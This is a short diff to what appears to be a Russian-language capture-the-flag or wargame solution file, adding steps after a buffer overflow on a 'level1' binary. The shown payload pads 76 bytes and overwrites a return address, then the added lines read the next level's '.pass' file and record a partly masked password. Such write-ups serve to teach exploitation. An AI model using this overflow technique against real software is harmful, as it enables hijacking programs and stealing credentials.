@@ -1,6 +1,9 @@
 # Решение
 python -c 'print "A" * 76 + "\x44\x84\x04\x08"' > /tmp/test
 cat /tmp/test - | ./level1
+cd ../level2
+cat .pass
+53a4***e77
 
 # Объяснение
 
